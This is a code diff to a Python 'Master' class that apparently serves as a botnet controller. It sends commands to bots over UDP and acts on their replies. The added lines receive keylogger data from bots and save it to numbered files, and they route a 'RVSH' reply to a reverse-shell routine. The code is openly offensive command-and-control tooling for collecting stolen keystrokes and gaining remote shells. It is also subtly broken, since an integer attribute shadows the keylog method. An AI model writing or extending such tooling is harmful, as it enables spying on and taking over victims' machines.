@@ -17,6 +17,8 @@ class Master:
 		#list of connections
 		self.sock = socket
 
+		self.keylog = 0
+
 	# 	self.conn = []
 
 	# def add_conn(self,c):
@@ -39,6 +41,15 @@ class Master:
 			data, addr = self.sock.recvfrom(1024)
 			print data
 
+	def keylog(self):
+		f = open("keylog"+str(self.keylog)+".txt",'w')
+		print "Waiting for keylog data..."
+		data, addr = self.sock.recvfrom(1024)
+		print "Received: " + data
+		f.write(data)
+		f.close()
+
+		self.keylog += 1
 
 
 
@@ -58,6 +69,8 @@ if __name__ == '__main__':
 	while True:
 
 		print "Enter command..."
+
+		#format = "BOT CMD"
 		cmd = raw_input()
 		cmd = cmd.split(' ')
 
@@ -71,9 +84,13 @@ if __name__ == '__main__':
 			print "sending " + msg + " to " + str(dest)
 			mast.sock.sendto(msg,mast.bots[dest])
 			data, addr = mast.sock.recvfrom(1024)
+			data = data.split(';')
 
-			if data == "RVSH":
+			if data[0] == "RVSH":
 				mast.reverse_shell(mast.bots[dest])
+
+			elif data[0] == "KEYL":
+				mast.keylog()
 
 
 
